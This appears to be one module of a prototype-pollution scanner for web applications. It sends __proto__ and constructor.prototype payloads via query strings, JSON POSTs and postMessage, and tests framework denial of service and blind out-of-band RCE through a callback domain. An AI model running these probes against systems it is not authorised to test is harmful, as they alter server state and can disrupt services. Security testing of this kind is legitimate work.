"""
ppmap/scanner/tier7_advanced.py - Tier 7: Advanced / Final
"""
import time
import json
import urllib.parse
import logging
from typing import Dict, List, Any

from ppmap.models.findings import Finding, VulnerabilityType, Severity
from ppmap.scanner.base import BaseTierScanner, ScanContext
from ppmap.scanner.helpers import Colors

logger = logging.getLogger(__name__)

from ppmap.scanner.payloads import FRAMEWORK_DOS_PAYLOADS
from ppmap.payloads.advanced import SERVER_SIDE_PP_PAYLOADS

class Tier7AdvancedScanner(BaseTierScanner):
    @property
    def tier_name(self) -> str:
        return "Tier 7 - Advanced / Edge Cases"

    def __init__(self):
        super().__init__()
        self.oob_detector = None

    def run(self, ctx: ScanContext) -> List[Finding]:
        self.driver = ctx.driver
        self.session = ctx.session
        self.timeout = ctx.config.timeout
        self.oob_enabled = ctx.config.oob_enabled
        
        if self.oob_enabled:
            # We will lazy init in test_blind_oob or main scan to avoid startup delay
            pass
            
        all_findings = []
        
        findings0 = self.test_object_assign_pollution(ctx.target_url)
        findings1 = self.test_json_reviver_pollution(ctx.target_url)
        findings2 = self.test_legacy_accessor_pollution(ctx.target_url)
        findings3 = self.test_postmessage_pp(ctx.target_url)
        findings4 = self.test_express_pp_dos(ctx.target_url)
        findings5 = []
        if self.oob_enabled:
            findings5 = self.test_blind_oob(ctx.target_url)

        all_findings.extend(findings0)
        all_findings.extend(findings1)
        all_findings.extend(findings2)
        all_findings.extend(findings3)
        all_findings.extend(findings4)
        all_findings.extend(findings5)
        
        # Convert findings to strictly typed Finding object where applicable 
        final_findings = []
        for f in all_findings:
            if isinstance(f, dict):
                final_findings.append(Finding(
                    name=f.get('description', f.get('type', 'Advanced Finding')),
                    severity=Severity.HIGH,
                    type=VulnerabilityType.PROTOTYPE_POLLUTION,
                    url=f.get('url', f.get('test_url', ctx.target_url)),
                    method=f.get('method', ''),
                    payload=str(f.get('payload', '')),
                    evidence='',
                    description=f.get('description', '')
                ))
            else:
                final_findings.append(f)
                
        return final_findings

    def get_pp_confidence(self, alerts_detected: bool, is_polluted: bool, has_sinks: bool, has_console_errors: bool) -> float:
        if alerts_detected: return 1.0
        if is_polluted: return 0.9
        if has_console_errors: return 0.5
        if has_sinks: return 0.3
        return 0.0

    def verify_prototype_pollution(self, prop_name: str) -> bool:
        if not hasattr(self, 'driver') or not self.driver:
            return False
        try:
            return self.driver.execute_script(f"return Object.prototype.hasOwnProperty('{prop_name}');") is True
        except:
            return False

    def verify_sspp(self, target_url: str) -> dict:
        canary = f"ppmap_{int(time.time() * 1000)}"
        try:
            self.session.post(target_url, json={"__proto__": {canary: "ppmap_verified"}}, timeout=self.timeout, verify=False)
            if canary in self.session.get(target_url, timeout=self.timeout, verify=False).text:
                return {"polluted": True, "canary": canary}
        except:
            pass
        return {"polluted": False, "canary": canary}

    def test_object_assign_pollution(self, target_url) -> List[Dict[str, Any]]:
        """Test Object.assign() based Prototype Pollution.
    
        Many modern frameworks use Object.assign() instead of $.extend().
        While Object.assign() itself doesn't traverse __proto__ in modern
        engines, custom wrappers and polyfills often do.
        """
        print(
            f"{Colors.CYAN}[→] Testing Object.assign() Prototype Pollution...{Colors.ENDC}"
        )
        findings: List[Dict[str, Any]] = []
        marker = f"oapp_{int(time.time())}"
    
        payloads = [
            # Direct __proto__ via query string (parsed by qs/query-string libs)
            f"?__proto__[{marker}]=POLLUTED",
            # Nested Object.assign via constructor path
            f"?constructor[prototype][{marker}]=POLLUTED",
            # JSON body via POST (common in REST APIs)
        ]
    
        try:
            for payload in payloads:
                try:
                    separator = "&" if "?" in target_url else "?"
                    payload_qs = payload.lstrip("?")
                    test_url = f"{target_url}{separator}{payload_qs}"
    
                    if hasattr(self, "driver") and self.driver:
                        self.driver.get(test_url)
                        time.sleep(2)
                        is_polluted = self.verify_prototype_pollution(marker)
    
                        if is_polluted:
                            confidence = self.get_pp_confidence(
                                alerts_detected=False, is_polluted=True,
                                has_sinks=False, has_console_errors=False
                            )
                            findings.append({
                                "type": "object_assign_pp",
                                "method": "OBJECT_ASSIGN",
                                "severity": "HIGH",
                                "description": f"Object.assign() PP confirmed: {marker} polluted on Object.prototype",
                                "payload": payload,
                                "test_url": test_url,
                                "verified": True,
                                "confidence": confidence,
                            })
                            print(
                                f"{Colors.FAIL}[!] Object.assign PP CONFIRMED (JS Verified): {payload[:50]}{Colors.ENDC}"
                            )
    
                            # Cleanup
                            try:
                                self.driver.execute_script(
                                    f"delete Object.prototype['{marker}'];"
                                )
                            except Exception:
                                pass
    
                except Exception as e:
                    logger.debug(f"Object.assign PP test error: {e}")
    
            # Also test POST with JSON body
            try:
                json_payload = {"__proto__": {marker: "POLLUTED"}}
                resp = self.session.post(
                    target_url, json=json_payload, timeout=self.timeout, verify=False
                )
                if resp.status_code < 400:
                    try:
                        resp_data = resp.json()
                        if marker in str(resp_data):
                            # Verify via SSPP canary method
                            sspp_result = self.verify_sspp(target_url)
                            if sspp_result["polluted"]:
                                findings.append({
                                    "type": "object_assign_pp",
                                    "method": "OBJECT_ASSIGN_POST_SSPP",
                                    "severity": "CRITICAL",
                                    "description": "Server-Side PP via Object.assign/spread in POST handler",
                                    "payload": str(json_payload),
                                    "verified": True,
                                    "confidence": 0.9,
                                })
                                print(
                                    f"{Colors.FAIL}[!] SSPP via Object.assign POST CONFIRMED!{Colors.ENDC}"
                                )
                    except (ValueError, TypeError):
                        pass
            except Exception:
                pass
    
        except Exception as e:
            print(
                f"{Colors.WARNING}[⚠] Object.assign PP test error: {str(e)[:60]}{Colors.ENDC}"
            )
    
        if not findings:
            print(f"{Colors.GREEN}[✓] Object.assign PP test completed{Colors.ENDC}")
        return findings
    
    def test_json_reviver_pollution(self, target_url) -> List[Dict[str, Any]]:
        """Test PP via JSON.parse() with custom reviver functions.
    
        Some applications use JSON.parse(data, reviver) where the reviver
        processes __proto__ keys without filtering, allowing pollution.
        """
        print(
            f"{Colors.CYAN}[→] Testing JSON.parse() Reviver Pollution...{Colors.ENDC}"
        )
        findings: List[Dict[str, Any]] = []
        canary = f"jrpp_{int(time.time())}"
    
        # Test via POST JSON endpoints
        test_payloads = [
            {"__proto__": {canary: "POLLUTED"}},
            {"constructor": {"prototype": {canary: "POLLUTED"}}},
        ]
    
        try:
            for payload in test_payloads:
                try:
                    resp = self.session.post(
                        target_url, json=payload, timeout=self.timeout, verify=False
                    )
                    if resp.status_code < 400:
                        # Check if canary leaked into response
                        if canary in resp.text or "POLLUTED" in resp.text:
                            # Double verify with SSPP canary
                            sspp = self.verify_sspp(target_url)
                            if sspp["polluted"]:
                                findings.append({
                                    "type": "json_reviver_pp",
                                    "method": "JSON_REVIVER",
                                    "severity": "HIGH",
                                    "description": "PP via JSON.parse reviver confirmed via SSPP canary",
                                    "payload": str(payload),
                                    "verified": True,
                                    "confidence": 0.7,
                                })
                                print(
                                    f"{Colors.FAIL}[!] JSON Reviver PP CONFIRMED!{Colors.ENDC}"
                                )
                            else:
                                # May be reflection only, log as low confidence
                                logger.debug(f"JSON reviver: canary in response but SSPP negative")
                except Exception as e:
                    logger.debug(f"JSON reviver test error: {e}")
    
        except Exception as e:
            print(
                f"{Colors.WARNING}[⚠] JSON reviver PP test error: {str(e)[:60]}{Colors.ENDC}"
            )
    
        if not findings:
            print(f"{Colors.GREEN}[✓] JSON reviver PP test completed{Colors.ENDC}")
        return findings
    
    def test_legacy_accessor_pollution(self, target_url) -> List[Dict[str, Any]]:
        """Test __lookupGetter__ / __defineGetter__ based Prototype Pollution.
    
        Legacy accessor methods (__lookupGetter__, __lookupSetter__,
        __defineGetter__, __defineSetter__) can be abused to pollute the
        prototype chain in older JS engines and environments.
        """
        print(
            f"{Colors.CYAN}[→] Testing Legacy Accessor Pollution...{Colors.ENDC}"
        )
        findings: List[Dict[str, Any]] = []
        marker = f"lapp_{int(time.time())}"
    
        # Legacy accessor payloads via query string
        payloads = [
            f"?__proto__[__defineGetter__]({marker},function(){{return 'PWNED'}})",
            f"?__proto__[{marker}]=POLLUTED",
            f"?__proto__[__lookupGetter__]={marker}",
        ]
    
        try:
            if hasattr(self, "driver") and self.driver:
                for payload in payloads:
                    try:
                        separator = "&" if "?" in target_url else "?"
                        payload_qs = payload.lstrip("?")
                        test_url = f"{target_url}{separator}{payload_qs}"
    
                        self.driver.get(test_url)
                        time.sleep(2)
    
                        # Check if legacy accessors exist on prototype
                        is_polluted = self.verify_prototype_pollution(marker)
    
                        # Also check if __defineGetter__ has been tampered
                        accessor_tampered = False
                        try:
                            accessor_tampered = self.driver.execute_script(
                                "return typeof Object.prototype.__defineGetter__ !== 'function' || "
                                "typeof Object.prototype.__lookupGetter__ !== 'function';"
                            )
                        except Exception:
                            pass
    
                        if is_polluted or accessor_tampered:
                            confidence = self.get_pp_confidence(
                                alerts_detected=False, is_polluted=is_polluted,
                                has_sinks=False, has_console_errors=accessor_tampered
                            )
                            findings.append({
                                "type": "legacy_accessor_pp",
                                "method": "LEGACY_ACCESSOR",
                                "severity": "MEDIUM",
                                "description": "Legacy accessor PP detected via __defineGetter__/__lookupGetter__",
                                "payload": payload,
                                "test_url": test_url,
                                "verified": is_polluted,
                                "confidence": confidence,
                            })
                            print(
                                f"{Colors.FAIL}[!] Legacy Accessor PP DETECTED: {payload[:50]}{Colors.ENDC}"
                            )
    
                        # Cleanup
                        try:
                            self.driver.execute_script(
                                f"delete Object.prototype['{marker}'];"
                            )
                        except Exception:
                            pass
    
                    except Exception as e:
                        logger.debug(f"Legacy accessor test error: {e}")
    
        except Exception as e:
            print(
                f"{Colors.WARNING}[⚠] Legacy accessor PP test error: {str(e)[:60]}{Colors.ENDC}"
            )
    
        if not findings:
            print(f"{Colors.GREEN}[✓] Legacy accessor PP test completed{Colors.ENDC}")
        return findings
    
    def test_postmessage_pp(self, target_url) -> List[Dict[str, Any]]:
        """Test Prototype Pollution via window.postMessage (Web Messages).
    
        Many SPAs use postMessage listeners that merge incoming data
        without sanitizing __proto__ keys. This is a cross-origin
        attack vector that bypasses server-side WAFs entirely.
        """
        print(
            f"{Colors.CYAN}[→] Testing postMessage Prototype Pollution...{Colors.ENDC}"
        )
        findings: List[Dict[str, Any]] = []
        marker = f"pmpp_{int(time.time())}"
    
        if not (hasattr(self, "driver") and self.driver):
            print(f"{Colors.YELLOW}[⚠] Browser required for postMessage PP test{Colors.ENDC}")
            return findings
    
        try:
            # Navigate to target
            self.driver.get(target_url)
            time.sleep(2)
    
            # Inject postMessage with PP payload (as a string to preserve __proto__)
            pm_script = f"""
            window.postMessage('{{"__proto__": {{"{marker}": "POLLUTED"}}, "constructor": {{"prototype": {{"{marker}_c": "POLLUTED"}}}}}}', '*');
            """
            self.driver.execute_script(pm_script)
            time.sleep(1)
    
            # Check if prototype was polluted via postMessage handler
            is_polluted = self.verify_prototype_pollution(marker)
            is_polluted_c = self.verify_prototype_pollution(f"{marker}_c")
    
            if is_polluted or is_polluted_c:
                confidence = self.get_pp_confidence(
                    alerts_detected=False, is_polluted=True,
                    has_sinks=False, has_console_errors=False
                )
                method = "POSTMESSAGE_PROTO" if is_polluted else "POSTMESSAGE_CONSTRUCTOR"
                findings.append({
                    "type": "postmessage_pp",
                    "method": method,
                    "severity": "HIGH",
                    "description": "Cross-origin PP via window.postMessage — bypasses server-side WAFs",
                    "verified": True,
                    "confidence": confidence,
                    "test_url": target_url,
                })
                print(
                    f"{Colors.FAIL}[!] postMessage PP CONFIRMED (JS Verified)!{Colors.ENDC}"
                )
    
                # Cleanup
                try:
                    self.driver.execute_script(
                        f"delete Object.prototype['{marker}']; delete Object.prototype['{marker}_c'];"
                    )
                except Exception:
                    pass
    
        except Exception as e:
            logger.debug(f"postMessage PP test error: {e}")
    
        if not findings:
            print(f"{Colors.GREEN}[✓] postMessage PP test completed{Colors.ENDC}")
        return findings
    
    def test_express_pp_dos(self, target_url) -> List[Dict[str, Any]]:
        """Test Express/Fastify framework DoS via Prototype Pollution.
    
        Tests Express-specific prototype properties that alter framework
        behavior when polluted (parameterLimit, allowDots, etc.).
        Uses FRAMEWORK_DOS_PAYLOADS from the payload engine.
        """
        print(
            f"{Colors.CYAN}[→] Testing Framework PP DoS vectors...{Colors.ENDC}"
        )
        findings: List[Dict[str, Any]] = []
    
        try:
            for name, payload, description in FRAMEWORK_DOS_PAYLOADS:
                try:
                    # Step 1: Get baseline response
                    baseline = self.session.get(
                        target_url, timeout=self.timeout, verify=False
                    )
                    baseline_status = baseline.status_code
                    baseline_spaces = len(baseline.text) - len(baseline.text.replace(" ", ""))
    
                    # Step 2: Send PP payload
                    resp = self.session.post(
                        target_url, json=payload, timeout=self.timeout, verify=False
                    )
    
                    # Step 3: Check if behavior changed (include multiple parameters for limit testing)
                    test_url = target_url + "?param1=a&param2=b&param3=c" if "?" not in target_url else target_url + "&param1=a&param2=b"
                    after = self.session.get(
                        test_url, timeout=self.timeout, verify=False
                    )
    
                    behavior_changed = False
                    change_detail = ""
    
                    if "status" in name and after.status_code != baseline_status:
                        behavior_changed = True
                        change_detail = f"Status: {baseline_status} → {after.status_code}"
                    elif "json_spaces" in name:
                        after_spaces = len(after.text) - len(after.text.replace(" ", ""))
                        if abs(after_spaces - baseline_spaces) > 10:
                            behavior_changed = True
                            change_detail = f"JSON spacing changed: {baseline_spaces} → {after_spaces}"
    
                    if behavior_changed:
                        findings.append({
                            "type": "framework_pp_dos",
                            "method": name.upper(),
                            "severity": "MEDIUM",
                            "description": f"{description} — {change_detail}",
                            "payload": str(payload),
                            "verified": True,
                            "confidence": 0.7,
                        })
                        print(
                            f"{Colors.FAIL}[!] Framework PP DoS CONFIRMED: {name} ({change_detail}){Colors.ENDC}"
                        )
    
                except Exception as e:
                    logger.debug(f"Framework DoS test error for {name}: {e}")
    
        except Exception as e:
            print(
                f"{Colors.WARNING}[⚠] Framework PP DoS test error: {str(e)[:60]}{Colors.ENDC}"
            )
    
        if not findings:
            print(f"{Colors.GREEN}[✓] Framework PP DoS test completed{Colors.ENDC}")
        return findings
    
    def test_blind_oob(self, target_url) -> List[Dict[str, Any]]:
        """Test for Blind OOB RCE via Prototype Pollution (v4.0)"""
        print(f"{Colors.CYAN}[→] Testing Blind OOB RCE (Interact.sh)...{Colors.ENDC}")
        findings: List[Dict[str, Any]] = []
    
        if not self.oob_detector:
            try:
                from ppmap.oob import OOBDetector
    
                self.oob_detector = OOBDetector()
                if not self.oob_detector.register():
                    print(
                        f"{Colors.WARNING}[!] Failed to register OOB session. Skipping blind tests.{Colors.ENDC}"
                    )
                    return []
            except ImportError:
                print(
                    f"{Colors.FAIL}[!] ppmap.oob module not found. Skipping.{Colors.ENDC}"
                )
                return []
            except Exception as e:
                print(f"{Colors.FAIL}[!] OOB Init Error: {e}{Colors.ENDC}")
                return []
    
        oob_domain = self.oob_detector.get_payload_domain()
        print(f"{Colors.BLUE}[*] OOB Domain: {oob_domain}{Colors.ENDC}")
    
        try:
            # Get payloads from utils
            from ppmap.payloads.advanced import SERVER_SIDE_PP_PAYLOADS
    
            oob_payloads = SERVER_SIDE_PP_PAYLOADS.get("blind_oob", [])
    
            for raw_payload in oob_payloads:
                # Replace %OOB% with actual domain
                payload_str = raw_payload.replace("%OOB%", oob_domain)
    
                try:
                    # Try parsing as JSON first
                    payload_json = json.loads(payload_str)
    
                    # Send Payload (POST JSON)
                    self.session.post(
                        target_url,
                        json=payload_json,
                        timeout=self.timeout,
                        verify=self.session.verify,
                    )
                except Exception:
                    pass
    
            print(f"{Colors.BLUE}[*] Waiting for OOB interactions...{Colors.ENDC}")
            time.sleep(2)  # Wait for DNS propagation/callback
            interactions = self.oob_detector.poll()
            if interactions:
                for i in interactions:
                    findings.append(
                        {
                            "type": "blind_server_side_pp_oob",
                            "method": "INTERACTSH_CALLBACK",
                            "severity": "CRITICAL",
                            "description": f"Received OOB interaction from {i.get('remote-address')} via {i.get('protocol')}",
                            "payload": f"OOB Domain: {oob_domain}",
                            "verified": True,
                            "impact": "Confirmed Remote Code Execution (RCE) or SSRF capability",
                        }
                    )
                    print(
                        f"{Colors.FAIL}[!] CRITICAL: OOB Interaction received! Blind PP Confirmed.{Colors.ENDC}"
                    )
        except Exception as e:
            print(f"{Colors.WARNING}[⚠] OOB test error: {e}{Colors.ENDC}")
    
        return findings
    
    